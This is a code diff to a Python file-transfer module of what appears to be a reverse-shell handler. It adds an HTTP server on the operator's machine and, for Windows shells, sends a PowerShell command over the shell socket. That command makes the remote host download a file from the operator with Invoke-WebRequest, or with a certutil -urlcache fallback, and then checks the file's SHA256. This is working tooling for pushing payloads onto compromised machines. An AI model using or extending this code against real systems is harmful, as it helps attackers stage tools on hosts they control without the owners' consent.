@@ -2,7 +2,11 @@ import hashlib
 import json
 import os
 import time
-
+import random
+import socketserver
+import threading
+import urllib.parse
+import http.server
 from .constants import XFER_MARK_END, XFER_MARK_START, XFER_STATE_SUFFIX
 
 
@@ -51,6 +55,54 @@ class FileTransfer:
         logger = self.h._get_session_logger(client_sock)
         if logger:
             logger.log_transfer(direction, local_path, remote_path, status, detail)
+            
+    def _start_agent_http_server(self, content, port=None, path='/agent.py'):
+        """
+        Start a simple HTTP server serving 'content' on a random port.
+        Returns (port, server_thread, stop_event, server).
+        path: the URL path to serve the content on (e.g., '/file').
+        """
+        if port is None:
+            for _ in range(20):
+                port = random.randint(8000, 9000)
+                try:
+                    server = socketserver.TCPServer(('0.0.0.0', port),
+                                                    self._make_agent_handler(content, path))
+                    break
+                except OSError:
+                    continue
+            else:
+                raise RuntimeError("Could not find a free port for HTTP server")
+        else:
+            server = socketserver.TCPServer(('0.0.0.0', port),
+                                            self._make_agent_handler(content, path))
+
+        stop_event = threading.Event()
+        def serve():
+            while not stop_event.is_set():
+                server.handle_request()
+            server.server_close()
+        thread = threading.Thread(target=serve, daemon=True)
+        thread.start()
+        return port, thread, stop_event, server
+
+    def _make_agent_handler(self, content, path='/agent.py'):
+        """Factory for a request handler that serves the given content on a specific path."""
+        class AgentHandler(http.server.SimpleHTTPRequestHandler):
+            def do_GET(self):
+                parsed = urllib.parse.urlparse(self.path)
+                if parsed.path == path:
+                    self.send_response(200)
+                    self.send_header('Content-Type', 'application/octet-stream')
+                    self.send_header('Content-Length', str(len(content)))
+                    self.end_headers()
+                    self.wfile.write(content)
+                else:
+                    self.send_response(404)
+                    self.end_headers()
+            def log_message(self, format, *args):
+                pass
+        return AgentHandler
 
     def upload_file(self, client_sock, local_path, remote_path, resume=False):
         info = self.h._client_info(client_sock)
@@ -58,14 +110,113 @@ class FileTransfer:
             print(f"{self.h.colors['red']}Client disconnected{self.h.colors['end']}")
             return False
         shell_type = info.get('type', 'unknown')
+
         if not os.path.isfile(local_path):
             print(f"{self.h.colors['red']}Local file not found: {local_path}{self.h.colors['end']}")
             return False
 
         total = os.path.getsize(local_path)
         local_hash = self.h._sha256_file(local_path)
-        chunk_size = self.h._write_chunk_size(remote_path, shell_type)
         state_path = self._state_path(local_path, remote_path, 'upload')
+
+        # ---------- WINDOWS: HTTP download ----------
+        if shell_type == 'windows':
+            if resume:
+                print(f"{self.h.colors['yellow']}Resume is not supported for Windows uploads – "
+                      f"performing full upload{self.h.colors['end']}")
+
+            try:
+                with open(local_path, 'rb') as f:
+                    content = f.read()
+            except OSError as e:
+                print(f"{self.h.colors['red']}Failed to read local file: {e}{self.h.colors['end']}")
+                self._log_transfer(client_sock, 'upload', local_path, remote_path, 'error', str(e))
+                return False
+
+            try:
+                port, thread, stop_event, server = self._start_agent_http_server(
+                    content,
+                    path='/file'
+                )
+            except RuntimeError as e:
+                print(f"{self.h.colors['red']}HTTP server start failed: {e}{self.h.colors['end']}")
+                self._log_transfer(client_sock, 'upload', local_path, remote_path, 'error', str(e))
+                return False
+
+            handler_ip = client_sock.getsockname()[0]
+            url = f"http://{handler_ip}:{port}/file"
+
+            escaped_path = remote_path.replace("'", "''")
+            ps_cmd = (
+                f"$ErrorActionPreference='Stop'; "
+                f"try {{ Invoke-WebRequest -Uri '{url}' -OutFile '{escaped_path}' -UseBasicParsing -ErrorAction Stop; "
+                f"Write-Output '{XFER_MARK_START}OK{XFER_MARK_END}' }} "
+                f"catch {{ certutil -urlcache -f '{url}' '{escaped_path}' 2>$null; "
+                f"if ($?) {{ Write-Output '{XFER_MARK_START}OK{XFER_MARK_END}' }} "
+                f"else {{ Write-Output '{XFER_MARK_START}FAIL{XFER_MARK_END}' }} }}"
+            )
+
+            print(
+                f"{self.h.colors['yellow']}Uploading {local_path} -> {remote_path} "
+                f"({self._format_size(total)}) via HTTP{self.h.colors['end']}"
+            )
+            print(f"{self.h.colors['blue']}Local SHA256: {local_hash}{self.h.colors['end']}")
+
+            self.h._flush_shell(client_sock)
+
+            client_sock.sendall((ps_cmd + '\n').encode('utf-8'))
+
+            start_time = time.time()
+            timeout = 60.0
+            output = b''
+            marker_start = XFER_MARK_START.encode()
+            marker_end = XFER_MARK_END.encode()
+
+            while time.time() - start_time < timeout:
+                try:
+                    chunk = client_sock.recv(4096)
+                    if not chunk:
+                        break
+                    output += chunk
+                    if marker_start in output and marker_end in output:
+                        break
+                except Exception:
+                    break
+
+            stop_event.set()
+            thread.join(timeout=2.0)
+
+            result = None
+            try:
+                start_idx = output.find(marker_start) + len(marker_start)
+                end_idx = output.find(marker_end, start_idx)
+                if start_idx != -1 and end_idx != -1:
+                    result = output[start_idx:end_idx].decode('utf-8').strip()
+            except:
+                pass
+
+            if result != 'OK':
+                print(f"{self.h.colors['red']}Windows upload failed (HTTP download error){self.h.colors['end']}")
+                self._log_transfer(client_sock, 'upload', local_path, remote_path, 'failed', result or 'no response')
+                return False
+
+            print(f"{self.h.colors['yellow']}Verifying remote integrity...{self.h.colors['end']}", end='', flush=True)
+            remote_hash = self.h._remote_sha256(client_sock, remote_path, shell_type)
+            if remote_hash == local_hash:
+                print(f"\r{self.h.colors['green']}Integrity verified — SHA256 match{self.h.colors['end']}          ")
+                print(f"{self.h.colors['green']}Upload complete: {remote_path}{self.h.colors['end']}")
+                self._clear_state(state_path)
+                self._log_transfer(client_sock, 'upload', local_path, remote_path, 'complete')
+                return True
+            else:
+                print(f"\r{self.h.colors['red']}Integrity mismatch!{self.h.colors['end']}                          ")
+                print(f"  Local:  {local_hash}")
+                print(f"  Remote: {remote_hash or 'unavailable'}")
+                self._log_transfer(client_sock, 'upload', local_path, remote_path, 'hash_mismatch')
+                return False
+
+        # ---------- Non‑Windows (Linux, macOS, etc.): original chunked upload (unchanged) ----------
+        chunk_size = self.h._write_chunk_size(remote_path, shell_type)
         state = self._load_state(state_path)
         transferred = 0
         first = True
